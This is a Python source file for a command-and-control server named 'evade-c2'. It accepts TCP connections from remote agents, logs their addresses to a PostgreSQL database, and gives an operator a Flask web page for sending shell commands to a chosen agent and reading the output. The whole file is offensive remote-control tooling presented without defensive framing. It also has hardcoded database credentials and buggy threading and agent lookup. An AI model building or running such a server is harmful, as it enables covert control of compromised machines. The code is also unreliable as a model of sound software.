import socket
import threading
import time
import flask
from flask import Flask, render_template, request
import psycopg2
import datetime

ip = '127.0.0.1'
port = 6666

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []
active_connections = 0

# Connect to PostgreSQL database
conn = psycopg2.connect(
    dbname='evade-c2',
    user='postgres',
    password='postgres',
    host='localhost'
)
cur = conn.cursor()

app = Flask(__name__)

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')


def handle_conn(connection, address, thread_index):
    global CMD_INPUT, CMD_OUTPUT, active_connections
    active_connections += 1
    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(2048).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index] != '':
                msg = CMD_INPUT[thread_index]
                connection.send(msg.encode())
                break
    active_connections -= 1
    connection_sakkaune(connection)


def connection_sakkaune(connection):
    connection.close()


def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip, port))
    ss.listen(5)
    global THREADS, IPS
    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_conn, args=(connection, address, thread_index))
        THREADS.append(t)
        IPS.append(address)
        print(f"Active connections: {active_connections}")
        
        # Log agent connection to database
        agent_name = address[0]  # Assuming IP address is used as agent name
        protocol = 'TCP'  # Assuming TCP protocol
        timestamp = datetime.datetime.now()
        log_agent_connection(agent_name, protocol, timestamp)
        t.start()


def log_agent_connection(agent_name, protocol, timestamp):
    try:
        cur.execute("INSERT INTO agent_id (agent_name, protocol, connection_time) VALUES (%s, %s, %s)",
                    (agent_name, protocol, timestamp))
        conn.commit()
    except Exception as e:
        print("Error logging agent connection:", e)


@app.before_request
def before_request():
    s1 = threading.Thread(target=server_socket)
    s1.start()


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/tcpagents')
def tcpagentsagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)


@app.route('/httpagents')
def httpagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)


@app.route('/<agentname>/executecmd')
def executecmd(agentname):
    return render_template("execute.html", name=agentname)


@app.route('/<agentname>/execute', methods=['GET', 'POST'])
def execute(agentname):
    global CMD_INPUT, CMD_OUTPUT
    if request.method == 'POST':
        cmd = request.form['command']
        for i, thread in enumerate(THREADS):
            if agentname in thread.name:
                req_index = i
                CMD_INPUT[req_index] = cmd
                time.sleep(1)
                cmdoutput = CMD_OUTPUT[req_index]
                return render_template("execute.html", cmdoutput=cmdoutput, name=agentname)


if __name__ == '__main__':
    app.run(debug=True, port=5001)
